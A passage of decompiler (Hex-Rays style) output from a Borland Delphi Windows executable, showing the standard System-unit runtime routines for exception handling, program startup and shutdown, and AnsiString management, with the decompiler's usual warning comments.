// 402BB3: variable 'v2' is possibly undefined

//----- (00402BCC) --------------------------------------------------------
_DWORD *__usercall sub_402BCC@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *result; // eax
  char v3; // dl

  result = sub_402D3C(a1, a2);
  if ( v3 > 0 )
    result = (_DWORD *)sub_402D2C(result);
  return result;
}
// 402BD3: variable 'v3' is possibly undefined

//----- (00402BDC) --------------------------------------------------------
_DWORD *__usercall sub_402BDC@<eax>(_DWORD *result@<eax>)
{
  if ( result )
    result = (_DWORD *)(*(int (**)(void))(*result - 4))();
  return result;
}

//----- (00402BE8) --------------------------------------------------------
_DWORD *__usercall System::TObject::InitInstance@<eax>(int a1@<eax>, _DWORD *a2@<edx>)
{
  int v2; // ebx
  _DWORD *result; // eax
  int *v4; // ebx
  int v5; // ecx
  _DWORD *v6; // ebx
  int v7; // esi
  unsigned int v8; // [esp-4h] [ebp-10h] BYREF
  int v9; // [esp+0h] [ebp-Ch] BYREF

  v2 = a1;
  *a2 = a1;
  v8 = *(_DWORD *)(a1 - 40);
  memset(a2 + 1, 0, 4 * ((v8 >> 2) - 1) + (v8 & 3));
  result = a2;
  while ( 1 )
  {
    if ( *(_DWORD *)(v2 - 72) )
      v8 = *(_DWORD *)(v2 - 72);
    v4 = *(int **)(v2 - 36);
    if ( !v4 )
      break;
    v2 = *v4;
  }
  if ( &v8 != (unsigned int *)&v9 )
  {
    v5 = *(_DWORD *)v8;
    v6 = (_DWORD *)(v8 + 4);
    do
    {
      v7 = v6[4];
      if ( v7 )
        *(_DWORD *)((char *)a2 + v6[5]) = v7;
      v6 += 7;
      --v5;
    }
    while ( v5 );
  }
  return result;
}

//----- (00402C40) --------------------------------------------------------
char __usercall sub_402C40@<al>(int *a1@<eax>, int a2@<edx>)
{
  int v2; // eax

  if ( a1 )
  {
    while ( 1 )
    {
      v2 = *a1;
      if ( v2 == a2 )
        break;
      a1 = *(int **)(v2 - 36);
      if ( !a1 )
        return (char)a1;
    }
    LOBYTE(a1) = 1;
  }
  return (char)a1;
}

//----- (00402C58) --------------------------------------------------------
int __usercall System::_16563@<eax>(int a1@<eax>, int a2@<ebx>)
{
  int result; // eax
  int i; // ebx
  unsigned __int16 *v5; // edi
  int v6; // ecx
  bool v7; // zf
  _WORD *v8; // edi
  int *v9; // ebx
  int v10; // [esp-4h] [ebp-8h]

  result = a2;
  for ( i = a1; ; i = *v9 )
  {
    v5 = *(unsigned __int16 **)(i - 48);
    if ( v5 )
    {
      v6 = *v5;
      v10 = v6;
      v7 = v5 + 1 == 0;
      v8 = v5 + 1;
      do
      {
        if ( !v6 )
          break;
        v7 = *v8++ == (unsigned __int16)result;
        --v6;
      }
      while ( !v7 );
      if ( v7 )
        break;
    }
    v9 = *(int **)(i - 36);
    if ( !v9 )
      return result;
  }
  return 2 * v10 - v6;
}

//----- (00402C88) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_402C88(int *a1@<eax>, int a2@<ebx>)
{
  char v2; // zf

  System::_16563(*a1, a2);
  if ( !v2 )
    __asm { jmp     ebx }
  sub_4027FC();
}
// 402C98: positive sp value 4 has been found
// 402C93: variable 'v2' is possibly undefined
// 4027FC: using guessed type void __noreturn sub_4027FC();

//----- (00402CA0) --------------------------------------------------------
int sub_402CA0()
{
  return -2147418113;
}

//----- (00402CB4) --------------------------------------------------------
int __usercall System::TObject::Dispatch@<eax>(void *a1@<edx>, int *a2@<eax>, int (*a3)(void)@<ebx>)
{
  char v4; // zf
  int result; // eax
  int *v6; // [esp-4h] [ebp-8h]

  LOWORD(a3) = *(_WORD *)a1;
  if ( !*(_WORD *)a1 || (unsigned __int16)a3 >= 0xC000u || (v6 = a2, System::_16563(*a2, (int)a3), a2 = v6, v4) )
    result = (*(int (**)(void))(*a2 - 16))();
  else
    result = a3();
  return result;
}
// 402CCD: variable 'v4' is possibly undefined

//----- (00402CDC) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall System::__linkproc__ ClassCreate@<eax>(int result@<eax>, char a2@<dl>, char a3)
{
  if ( a2 >= 0 )
    result = (*(int (**)(void))(result - 12))();
  __writefsdword(0, (unsigned int)&a3);
  return result;
}

//----- (00402D2C) --------------------------------------------------------
int __usercall sub_402D2C@<eax>(_DWORD *a1@<eax>)
{
  return (*(int (**)(void))(*a1 - 8))();
}

//----- (00402D34) --------------------------------------------------------
_DWORD *__usercall sub_402D34@<eax>(_DWORD *a1@<eax>)
{
  (*(void (**)(void))(*a1 - 28))();
  return a1;
}

//----- (00402D3C) --------------------------------------------------------
_DWORD *__usercall sub_402D3C@<eax>(_DWORD *result@<eax>, char a2@<dl>)
{
  _DWORD *v2; // [esp-4h] [ebp-4h]

  if ( a2 > 0 )
  {
    v2 = result;
    (*(void (**)(void))(*result - 24))();
    result = v2;
  }
  return result;
}

//----- (00402D4C) --------------------------------------------------------
void sub_402D4C()
{
  if ( (unsigned __int8)byte_41C008 > 1u )
    RaiseException(0xEEDFADFu, 0, 0, 0);
}
// 41C008: using guessed type char byte_41C008;

//----- (00402D68) --------------------------------------------------------
void __usercall __spoils<edx,ecx> System::_16583(ULONG_PTR a1@<eax>, ULONG_PTR a2@<edx>)
{
  ULONG_PTR v2[3]; // [esp-Ch] [ebp-Ch] BYREF

  if ( byte_41C008 )
  {
    v2[1] = a1;
    v2[0] = a2;
    RaiseException(0xEEDFAE4u, 0, 2u, v2);
  }
}
// 41C008: using guessed type char byte_41C008;

//----- (00402D9C) --------------------------------------------------------
void __usercall __spoils<edx,ecx> sub_402D9C(ULONG_PTR a1@<ebx>)
{
  ULONG_PTR v1; // [esp-8h] [ebp-8h] BYREF

  if ( (unsigned __int8)byte_41C008 > 1u )
  {
    v1 = a1;
    RaiseException(0xEEDFAE0u, 0, 1u, &v1);
  }
}
// 41C008: using guessed type char byte_41C008;

//----- (00402DB0) --------------------------------------------------------
void sub_402DB0()
{
  ;
}

//----- (00402DD0) --------------------------------------------------------
void __fastcall __spoils<edx,ecx> System::_16588(ULONG_PTR a1, ULONG_PTR a2)
{
  ULONG_PTR v2; // ecx
  ULONG_PTR v3[4]; // [esp-10h] [ebp-10h] BYREF

  if ( (unsigned __int8)byte_41C008 > 1u )
  {
    v3[2] = a2;
    v3[1] = a1;
    sub_402DB0();
    v3[0] = v2;
    RaiseException(0xEEDFAE1u, 0, 1u, v3);
  }
}
// 402DE1: variable 'v2' is possibly undefined
// 41C008: using guessed type char byte_41C008;

//----- (00402DF8) --------------------------------------------------------
void __fastcall sub_402DF8(int a1, ULONG_PTR a2)
{
  ULONG_PTR v2; // [esp-4h] [ebp-4h] BYREF

  if ( (unsigned __int8)byte_41C008 > 1u )
  {
    v2 = a2;
    RaiseException(0xEEDFAE2u, 0, 1u, &v2);
  }
}
// 41C008: using guessed type char byte_41C008;

//----- (00402E14) --------------------------------------------------------
void __spoils<ecx> sub_402E14()
{
  ULONG_PTR v0; // [esp-8h] [ebp-8h] BYREF

  if ( (unsigned __int8)byte_41C008 > 1u )
    RaiseException(0xEEDFAE3u, 0, 2u, &v0);
}
// 41C008: using guessed type char byte_41C008;

//----- (00402E34) --------------------------------------------------------
int __usercall __linkproc__ HandleAnyException@<eax>(EXCEPTION_RECORD *a1@<ebx>, int a2@<ebp>, void *a3@<edi>, ULONG_PTR a4@<esi>, struct _EXCEPTION_POINTERS ExceptionInfo, int a6)
{
  PEXCEPTION_RECORD v6; // eax
  ULONG_PTR v7; // edx
  PVOID v8; // ecx
  ULONG_PTR v9; // eax
  bool v10; // zf
  PCONTEXT v11; // edi
  _DWORD *v12; // eax
  ULONG_PTR v13; // ebx
  _DWORD v15[6]; // [esp-24h] [ebp-24h] BYREF
  PVOID v16; // [esp-Ch] [ebp-Ch]
  ULONG_PTR v17; // [esp-8h] [ebp-8h]
  EXCEPTION_RECORD *v18; // [esp-4h] [ebp-4h]

  v6 = ExceptionInfo.ExceptionRecord;
  if ( (ExceptionInfo.ExceptionRecord->ExceptionFlags & 6) != 0 )
    return 1;
  v7 = ExceptionInfo.ExceptionRecord->ExceptionInformation[1];
  v8 = (PVOID)ExceptionInfo.ExceptionRecord->ExceptionInformation[0];
  if ( ExceptionInfo.ExceptionRecord->ExceptionCode != 250477278 )
  {
    sub_402B4C();
    if ( !dword_41E00C )
      return 1;
    v9 = dword_41E00C();
    if ( !v9 )
      return 1;
    if ( ExceptionInfo.ExceptionRecord->ExceptionCode != 250608334 )
    {
      System::_16583(v9, a6);
      if ( byte_41C00C )
      {
        if ( !byte_41C008 )
        {
          v18 = (EXCEPTION_RECORD *)v9;
          if ( UnhandledExceptionFilter(&ExceptionInfo) )
          {
            v7 = (ULONG_PTR)v18;
            v6 = ExceptionInfo.ExceptionRecord;
            v8 = ExceptionInfo.ExceptionRecord->ExceptionAddress;
            goto LABEL_14;
          }
          return 1;
        }
      }
    }
    v7 = v9;
    v6 = ExceptionInfo.ExceptionRecord;
    v8 = ExceptionInfo.ExceptionRecord->ExceptionAddress;
  }
  if ( (unsigned __int8)byte_41C00C <= 1u
    || byte_41C008
    || (v18 = v6,
        v17 = v7,
        v16 = v8,
        v10 = UnhandledExceptionFilter(&ExceptionInfo) == 0,
        v8 = v16,
        v7 = v17,
        v6 = v18,
        !v10) )
  {
LABEL_14:
    v6->ExceptionFlags |= 2u;
    v18 = a1;
    v17 = a4;
    v16 = a3;
    v15[5] = a2;
    v15[4] = NtCurrentTeb()->NtTib.ExceptionList;
    v15[3] = v6;
    v15[2] = v7;
    v15[1] = v8;
    RtlUnwind(ExceptionInfo.ContextRecord, &loc_402F0B, v6, 0);
    v11 = ExceptionInfo.ContextRecord;
    v12 = __linkproc__ GetTls();
    v15[0] = *v12;
    *v12 = v15;
    v13 = v11->Dr0;
    v11->Dr0 = (DWORD)&loc_402F37;
    v13 += 5;
    sub_402D9C(v13);
    __asm { jmp     ebx }
  }
  return 1;
}
// 41C008: using guessed type char byte_41C008;
// 41C00C: using guessed type char byte_41C00C;
// 41E00C: using guessed type int (*dword_41E00C)(void);

//----- (00402F60) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __cdecl System::__linkproc__ HandleFinally(int a1, ULONG_PTR a2)
{
  int v2; // ecx
  void (*v3)(void); // ecx

  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    v2 = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(a2 + 4) = &loc_402F90;
    System::_16588(v2 + 5, a2);
    v3();
  }
  return 1;
}
// 402F8A: variable 'v3' is possibly undefined

//----- (00402F98) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __stdcall sub_402F98(DWORD a1, DWORD a2, DWORD a3, const ULONG_PTR *a4)
{
  RaiseException(a1, a2, a3, a4);
}
// 402F99: positive sp value 4 has been found

//----- (00402FB4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __cdecl System::__linkproc__ RaiseAgain(int a1, int a2)
{
  _DWORD **v2; // eax
  _DWORD *v3; // edx
  _DWORD *v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD **v6; // [esp-14h] [ebp-14h]

  *(_DWORD *)(a2 + 4) = &loc_402FFF;
  v2 = (_DWORD **)__linkproc__ GetTls();
  v3 = *v2;
  *v2 = (_DWORD *)**v2;
  v4 = (_DWORD *)v3[3];
  v4[1] &= 0xFFFFFFFD;
  if ( *v4 != 250477278 )
  {
    sub_402BDC((_DWORD *)v3[2]);
    sub_402D4C();
  }
  *v6 = NtCurrentTeb()->NtTib.ExceptionList->Next;
  return 1;
}
// 402FFF: positive sp value 28 has been found
// 402FB4: could not find valid save-restore pair for ebx
// 402FB4: could not find valid save-restore pair for ebp
// 402FB4: could not find valid save-restore pair for edi
// 402FB4: could not find valid save-restore pair for esi
// 402FF9: variable 'v6' is possibly undefined

//----- (00403008) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl System::__linkproc__ DoneExcept(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12)
{
  _DWORD **v12; // eax
  _DWORD *v13; // edx
  unsigned int v15; // [esp-10h] [ebp-10h]
  ULONG_PTR v16; // [esp-4h] [ebp-4h]

  v12 = (_DWORD **)__linkproc__ GetTls();
  v13 = *v12;
  *v12 = (_DWORD *)**v12;
  sub_402BDC((_DWORD *)v13[2]);
  __writefsdword(0, v15);
  sub_402DF8(v15, v16);
  __asm { jmp     edx }
}
// 403024: positive sp value 4 has been found
// 40302B: variable 'v15' is possibly undefined
// 403030: variable 'v16' is possibly undefined

//----- (00403038) --------------------------------------------------------
int __stdcall sub_403038(unsigned int a1, int a2, int a3)
{
  __writefsdword(0, a1);
  return ((int (*)(void))(a2 + 5))();
}

//----- (00403050) --------------------------------------------------------
void __usercall __noreturn sub_403050(int a1@<eax>)
{
  sub_4034BC(a1);
}

//----- (0040305C) --------------------------------------------------------
void __stdcall __noreturn System::_16600(int *a1)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  unsigned int v4; // eax
  bool v5; // cf
  unsigned int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  unsigned __int8 v10; // al

  v1 = *a1;
  if ( *a1 > -1073741678 )
  {
    if ( v1 > -1073741674 )
    {
      v9 = v1 + 1073741571;
      if ( !v9 )
      {
        v10 = -54;
        goto LABEL_33;
      }
      if ( v9 == 61 )
      {
        v10 = -39;
        goto LABEL_33;
      }
    }
    else
    {
      if ( v1 == -1073741674 )
      {
        v10 = -38;
        goto LABEL_33;
      }
      v7 = v1 + 1073741677;
      if ( !v7 )
        goto LABEL_27;
      v8 = v7 - 1;
      if ( !v8 )
      {
        v10 = -56;
        goto LABEL_33;
      }
      if ( v8 == 1 )
      {
        v10 = -41;
        goto LABEL_33;
      }
    }
  }
  else
  {
    if ( *a1 == -1073741678 )
      goto LABEL_24;
    if ( v1 <= -1073741682 )
    {
      if ( v1 == -1073741682 )
      {
        v10 = -56;
        goto LABEL_33;
      }
      v2 = v1 + 1073741819;
      if ( !v2 )
      {
        v10 = -40;
        goto LABEL_33;
      }
      v3 = v2 - 135;
      if ( !v3 )
      {
        v10 = -55;
        goto LABEL_33;
      }
      if ( v3 != 1 )
        goto LABEL_32;
LABEL_27:
      v10 = -50;
      goto LABEL_33;
    }
    v4 = v1 + 1073741681;
    v5 = v4 < 2;
    v6 = v4 - 2;
    if ( v5 )
    {
LABEL_24:
      v10 = -49;
      goto LABEL_33;
    }
    if ( !v6 )
    {
      v10 = -51;
      goto LABEL_33;
    }
  }
LABEL_32:
  v10 = -1;
LABEL_33:
  sub_403050(v10);
}

//----- (004030FC) --------------------------------------------------------
int __cdecl System::_16601(struct _EXCEPTION_POINTERS ExceptionInfo)
{
  PEXCEPTION_RECORD v1; // eax
  ULONG_PTR retaddr; // [esp+0h] [ebp+0h]

  if ( (ExceptionInfo.ExceptionRecord->ExceptionFlags & 6) == 0
    && (byte_41C008 || UnhandledExceptionFilter(&ExceptionInfo)) )
  {
    sub_402B4C();
    RtlUnwind(ExceptionInfo.ContextRecord, &loc_403141, v1, 0);
    if ( ExceptionInfo.ExceptionRecord->ExceptionCode == 250477278 || dword_41E00C && dword_41E00C() )
    {
      sub_402E14();
      if ( dword_41E000 )
        dword_41E000();
      retaddr = ExceptionInfo.ExceptionRecord->ExceptionInformation[0];
      sub_4034BC(217);
    }
    JUMPOUT(0x40305C);
  }
  return 0;
}
// 40315B: control flows out of bounds to 40305C
// 40313C: variable 'v1' is possibly undefined
// 41C008: using guessed type char byte_41C008;
// 41E000: using guessed type int (*dword_41E000)(void);
// 41E00C: using guessed type int (*dword_41E00C)(void);

//----- (00403198) --------------------------------------------------------
struct _EXCEPTION_REGISTRATION_RECORD **__usercall sub_403198@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<ebp>)
{
  struct _EXCEPTION_REGISTRATION_RECORD **result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v2; // ecx

  result = (struct _EXCEPTION_REGISTRATION_RECORD **)&a1[-2].Handler;
  v2 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&a1[-2].Handler);
  *result = v2;
  result[1] = (struct _EXCEPTION_REGISTRATION_RECORD *)System::_16601;
  result[2] = a1;
  dword_41E4A0 = (int)&a1[-2].Handler;
  return result;
}
// 41E4A0: using guessed type int dword_41E4A0;

//----- (004031B8) --------------------------------------------------------
int System::_16603()
{
  int result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v1; // ecx

  result = dword_41E4A0;
  v1 = NtCurrentTeb()->NtTib.ExceptionList;
  if ( (struct _EXCEPTION_REGISTRATION_RECORD *)dword_41E4A0 == v1 )
  {
    result = *(_DWORD *)dword_41E4A0;
    __writefsdword(0, *(_DWORD *)dword_41E4A0);
  }
  else
  {
    while ( v1 != (struct _EXCEPTION_REGISTRATION_RECORD *)-1 )
    {
      if ( v1->Next == (struct _EXCEPTION_REGISTRATION_RECORD *)dword_41E4A0 )
      {
        result = *(_DWORD *)dword_41E4A0;
        v1->Next = *(struct _EXCEPTION_REGISTRATION_RECORD **)dword_41E4A0;
        return result;
      }
      v1 = v1->Next;
    }
  }
  return result;
}
// 41E4A0: using guessed type int dword_41E4A0;

//----- (004031E0) --------------------------------------------------------
int System::_16604()
{
  int result; // eax
  int v1; // ebx
  int v2; // esi
  void (__cdecl *v3)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *); // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v4; // [esp-Ch] [ebp-18h] BYREF
  void *v5; // [esp-8h] [ebp-14h]
  int *v6; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = (int)*(&dword_41E49C + 2);
  if ( result )
  {
    v1 = (int)*(&dword_41E49C + 3);
    v2 = *(_DWORD *)(result + 4);
    v6 = &savedregs;
    v5 = &loc_403226;
    v4 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v4);
    while ( v1 > 0 )
    {
      *(&dword_41E49C + 3) = (const void *)--v1;
      v3 = *(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(v2 + 8 * v1 + 4);
      if ( v3 )
        v3(v4, v5, v6);
    }
    result = 0;
    __writefsdword(0, (unsigned int)v4);
  }
  return result;
}

//----- (00403240) --------------------------------------------------------
int System::_16705()
{
  int result; // eax
  int v1; // esi
  int v2; // ebx
  int v3; // edi
  void (*v4)(void); // eax
  unsigned int v5[6]; // [esp-Ch] [ebp-18h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  result = dword_41E4A4;
  if ( dword_41E4A4 )
  {
    v1 = *(_DWORD *)dword_41E4A4;
    v2 = 0;
    v3 = *(_DWORD *)(dword_41E4A4 + 4);
    v5[2] = (unsigned int)&savedregs;
    v5[1] = (unsigned int)&loc_403286;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    if ( v1 > 0 )
    {
      do
      {
        v4 = *(void (**)(void))(v3 + 8 * v2++);
        dword_41E4A8 = v2;
        if ( v4 )
          v4();
      }
      while ( v1 > v2 );
    }
    result = 0;
    __writefsdword(0, v5[0]);
  }
  return result;
}
// 41E4A4: using guessed type int dword_41E4A4;
// 41E4A8: using guessed type int dword_41E4A8;

//----- (004032A0) --------------------------------------------------------
int __usercall __linkproc__ StartExe@<eax>(int a1@<eax>, int a2@<edx>, struct _EXCEPTION_REGISTRATION_RECORD *a3@<ebp>)
{
  dword_41E4A4 = a1;
  dword_41E4A8 = 0;
  dword_41E4AC = a2;
  dword_41E01C = *(_DWORD *)(a2 + 4);
  sub_403198(a3);
  byte_41E024 = 0;
  return System::_16705();
}
// 41E01C: using guessed type int dword_41E01C;
// 41E024: using guessed type char byte_41E024;
// 41E4A4: using guessed type int dword_41E4A4;
// 41E4A8: using guessed type int dword_41E4A8;
// 41E4AC: using guessed type int dword_41E4AC;

//----- (004032D0) --------------------------------------------------------
void __usercall sub_4032D0(_DWORD *a1@<eax>)
{
  int v1; // ebx
  BYTE ***v2; // esi

  v1 = *a1;
  v2 = (BYTE ***)(a1 + 1);
  do
  {
    System::LoadResString((int)*v2[1], *v2);
    v2 += 2;
    --v1;
  }
  while ( v1 );
}

//----- (004032EC) --------------------------------------------------------
int __usercall sub_4032EC@<eax>(int *a1@<eax>)
{
  int v1; // ebx
  _DWORD *v2; // esi
  int result; // eax

  v1 = *a1;
  v2 = a1 + 1;
  do
  {
    result = v2[2] + *(_DWORD *)v2[1];
    *(_DWORD *)*v2 = result;
    v2 += 3;
    --v1;
  }
  while ( v1 );
  return result;
}

//----- (0040330C) --------------------------------------------------------
unsigned int System::_16617()
{
  unsigned int v0; // eax
  char *v1; // ebx
  unsigned int v2; // et2
  unsigned int result; // eax
  char *v4; // ebx

  v0 = dword_41E030;
  v1 = aAt00000000;
  do
  {
    v2 = v0 % 0xA;
    v0 /= 0xAu;
    *v1-- = v2 + 48;
  }
  while ( v0 );
  result = dword_41E038 - (_DWORD)System::FindHInstance((const void *)dword_41E038);
  v4 = &aAt00000000[12];
  do
  {
    *v4-- = byte_41C050[result & 0xF];
    result >>= 4;
  }
  while ( result );
  return result;
}
// 41E030: using guessed type int dword_41E030;
// 41E038: using guessed type int dword_41E038;

//----- (0040335C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
BOOL __stdcall System::_16618(int a1, int a2, int a3)
{
  qmemcpy(&dword_41E49C, dword_41E49C, 0x2Cu);
  return _InterlockedExchange(&dword_41E030, 0) == 0;
}
// 40338C: positive sp value 4 has been found
// 40335C: could not find valid save-restore pair for ebp
// 40335C: could not find valid save-restore pair for edi
// 40335C: could not find valid save-restore pair for esi
// 41E030: using guessed type int dword_41E030;

//----- (00403390) --------------------------------------------------------
void __noreturn System::__linkproc__ Halt0()
{
  void (*v0)(void); // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v3; // eax
  int v4; // [esp+0h] [ebp-10h]
  int v5; // [esp+4h] [ebp-Ch]
  int *v6; // [esp+8h] [ebp-8h]

  if ( !*((_BYTE *)&dword_41E49C + 36) && unk_41E034 )
  {
    do
    {
      v0 = (void (*)(void))unk_41E034;
      unk_41E034 = 0;
      v0();
    }
    while ( unk_41E034 );
  }
  if ( dword_41E038 )
  {
    System::_16617();
    if ( byte_41E040 )
    {
      v1 = System::__linkproc__ Write0CString(dword_41E214, Text);
      sub_40520F(v1);
    }
    else if ( !byte_41C010 )
    {
      MessageBoxA(0, Text, Caption, 0);
    }
    dword_41E038 = 0;
  }
  while ( 1 )
  {
    if ( *((_BYTE *)&dword_41E49C + 36) == 2 && !dword_41E030 )
      *(&dword_41E49C + 3) = 0;
    System::_16604();
    if ( *((_BYTE *)&dword_41E49C + 36) <= 1u || dword_41E030 )
    {
      v2 = *(&dword_41E49C + 4);
      if ( v2 )
      {
        System::UnregisterModule(v2);
        v3 = (int)*(&dword_41E49C + 4);
        if ( *(_DWORD *)(v3 + 16) != *(_DWORD *)(v3 + 4) )
          FreeLibrary(*(HMODULE *)(v3 + 16));
      }
    }
    System::_16603();
    if ( *((_BYTE *)&dword_41E49C + 36) == 1 )
      ((void (*)(void))*(&dword_41E49C + 10))();
    if ( *((_BYTE *)&dword_41E49C + 36) )
      System::_16618(v4, v5, (int)v6);
    if ( !dword_41E49C )
      ExitProcess(dword_41E030);
    v6 = &dword_41E030;
    qmemcpy(&dword_41E49C, dword_41E49C, 0x2Cu);
  }
}
// 403460: variable 'v4' is possibly undefined
// 403460: variable 'v5' is possibly undefined
// 403460: variable 'v6' is possibly undefined
// 41C010: using guessed type char byte_41C010;
// 41E030: using guessed type int dword_41E030;
// 41E038: using guessed type int dword_41E038;
// 41E040: using guessed type char byte_41E040;

//----- (004034B0) --------------------------------------------------------
void __usercall __noreturn sub_4034B0(int a1@<eax>)
{
  dword_41E030 = a1;
  System::__linkproc__ Halt0();
}
// 41E030: using guessed type int dword_41E030;

//----- (004034BC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn sub_4034BC(int a1@<eax>)
{
  int v1; // [esp-4h] [ebp-4h]

  dword_41E038 = v1;
  sub_4034B0(a1);
}
// 4034C2: positive sp value 4 has been found
// 4034BC: variable 'v1' is possibly undefined
// 41E038: using guessed type int dword_41E038;

//----- (004034C8) --------------------------------------------------------
void __fastcall System::__linkproc__ LStrClr(LStr *result)
{
  int *v1; // eax
  int v2; // edx

  v2 = *v1;
  if ( *v1 )
  {
    *v1 = 0;
    if ( *(int *)(v2 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
      sub_4025B0(v2 - 8);
  }
}
// 4034C8: variable 'v1' is possibly undefined

//----- (004034EC) --------------------------------------------------------
void __fastcall System::__linkproc__ LStrArrayClr(LStr *result, int array_len)
{
  int *v2; // eax
  int *v3; // ebx
  int v5; // edx

  v3 = v2;
  do
  {
    v5 = *v3;
    if ( *v3 )
    {
      *v3 = 0;
      if ( *(int *)(v5 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v5 - 8)) )
        sub_4025B0(v5 - 8);
    }
    ++v3;
    --array_len;
  }
  while ( array_len );
}
// 4034EE: variable 'v2' is possibly undefined

//----- (0040351C) --------------------------------------------------------
void __usercall __linkproc__ LStrAsg(char **a@<eax>, char *b@<edx>)
{
  BYTE *v2; // edx
  BYTE *v3; // eax
  __int32 v4; // edx
  char *v5; // [esp-8h] [ebp-8h]
  char *v6; // [esp-8h] [ebp-8h]
  char **v7; // [esp-4h] [ebp-4h]

  if ( b )
  {
    if ( (*((_DWORD *)b - 2) + 1 < 0) ^ __OFADD__(1, *((_DWORD *)b - 2)) | (*((_DWORD *)b - 2) == -1) )
    {
      v7 = a;
      v5 = b;
      v2 = (BYTE *)System::__linkproc__ NewAnsiString(*((_DWORD *)b - 1));
      v3 = (BYTE *)v5;
      v6 = (char *)v2;
      Move(v3, v2, *((_DWORD *)v3 - 1));
      b = v6;
      a = v7;
    }
    else
    {
      _InterlockedIncrement((volatile signed __int32 *)b - 2);
    }
  }
  v4 = _InterlockedExchange((volatile __int32 *)a, (__int32)b);
  if ( v4 && *(int *)(v4 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v4 - 8)) )
    sub_4025B0(v4 - 8);
}

//----- (00403560) --------------------------------------------------------
void __usercall __linkproc__ LStrLAsg(char **a@<eax>, char *b@<edx>)
{
  __int32 v2; // edx

  if ( b && !((*((_DWORD *)b - 2) + 1 < 0) ^ __OFADD__(1, *((_DWORD *)b - 2)) | (*((_DWORD *)b - 2) == -1)) )
    _InterlockedIncrement((volatile signed __int32 *)b - 2);
  v2 = _InterlockedExchange((volatile __int32 *)a, (__int32)b);
  if ( v2 && *(int *)(v2 - 8) >= 1 && !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
    sub_4025B0(v2 - 8);
}

//----- (0040358C) --------------------------------------------------------
int __usercall System::__linkproc__ NewAnsiString@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 <= 0 )
    return 0;
  result = sub_402598(a1 + 9) + 8;
  *(_DWORD *)(result - 4) = a1;
  *(_DWORD *)(result - 8) = 1;
  *(_BYTE *)(result + a1) = 0;
  return result;
}

//----- (004035B0) --------------------------------------------------------
void __usercall __linkproc__ LStrFromPCharLen(BYTE **a1@<eax>, BYTE *a2@<edx>, int a3@<ecx>)
{
  BYTE *v6; // eax
  LStr *v7; // ecx
  BYTE *v8; // edi

  v6 = (BYTE *)System::__linkproc__ NewAnsiString(a3);
  v7 = (LStr *)a3;
  v8 = v6;
  if ( a2 )
    Move(a2, v6, (int)v7);
  System::__linkproc__ LStrClr(v7);
  *a1 = v8;
}
// 4035D3: variable 'v7' is possibly undefined

//----- (004035E0) --------------------------------------------------------
void __usercall __linkproc__ LStrFromPWCharLen(int cchWideChar@<ecx>, LPCWSTR lpWideCharStr@<edx>, BYTE **a3@<eax>)
{
  int v6; // esi
  int v7; // esi
  CHAR MultiByteStr[2064]; // [esp+0h] [ebp-810h] BYREF

  if ( cchWideChar > 0 )
  {
    if ( cchWideChar >= 1024
      || (v6 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, MultiByteStr, 2048, 0, 0), v6 <= 0) )
    {
      v7 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, 0, 0, 0, 0);
      __linkproc__ LStrFromPCharLen(a3, 0, v7);
      WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, (LPSTR)*a3, v7, 0, 0);
    }
    else
    {
      __linkproc__ LStrFromPCharLen(a3, (BYTE *)MultiByteStr, v6);
    }
  }
  else
  {
    System::__linkproc__ LStrClr((LStr *)cchWideChar);
  }
}

//----- (00403670) --------------------------------------------------------
void __usercall sub_403670(BYTE **a1@<eax>)
{
  BYTE v1; // [esp-4h] [ebp-4h] BYREF

  __linkproc__ LStrFromPCharLen(a1, &v1, 1);
}

//----- (00403680) --------------------------------------------------------
// Delphi 5 Visual Component Library
void __usercall __linkproc__ LStrFromPChar_0(BYTE **a1@<eax>, BYTE *a2@<edx>)
{
  int v2; // ecx
  BYTE *v3; // ecx
  BYTE *v4; // [esp-4h] [ebp-4h]

  v2 = 0;
  if ( a2 )
  {
    v4 = a2;
    while ( *a2 )
    {
      if ( !a2[1] )
        goto LABEL_10;
      if ( !a2[2] )
        goto LABEL_9;
      if ( !a2[3] )
      {
        ++a2;
LABEL_9:
        ++a2;
LABEL_10:
        ++a2;
        break;
      }
      a2 += 4;
    }
    v3 = a2;
    a2 = v4;
    v2 = v3 - v4;
  }
  __linkproc__ LStrFromPCharLen(a1, a2, v2);
